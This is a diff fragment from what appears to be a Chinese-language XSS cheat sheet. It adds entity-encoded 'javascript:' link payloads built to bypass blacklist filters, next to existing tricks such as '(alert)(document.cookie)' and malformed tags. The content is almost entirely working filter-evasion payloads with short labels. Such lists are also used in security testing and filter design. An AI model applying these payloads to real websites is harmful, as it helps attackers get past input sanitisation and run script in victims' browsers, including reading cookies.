@@ -402,11 +402,21 @@ html实体编码 十进制 (不带分号 chrome下可行)
 # 利用浏览器兼容性 - 畸形标签
 </script x>
 ```
+
 - 绕过某些黑名单规则 如`alert(`
 ```
 (alert)(document.cookie)
 ((alert))((document.cookie))
 ```
+
+- 绕过指定黑名单规则 `javascript:`
+```html
+<a href="javascript&colon;alert(1)">XSS</a>
+<a href="java&Tab;script:alert(1)">XSS</a>
+<a href="java&NewLine;script:alert(1)">XSS</a>
+<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
+```
+
 - 绕过某些黑名单规则 使用[jjencode](http://utf-8.jp/public/jjencode.html) 或 [aaencode](http://utf-8.jp/public/aaencode.html)编码. 注:编码后的内容可放在"事件处理属性"中 如`onerror=`
 ```
 <script>
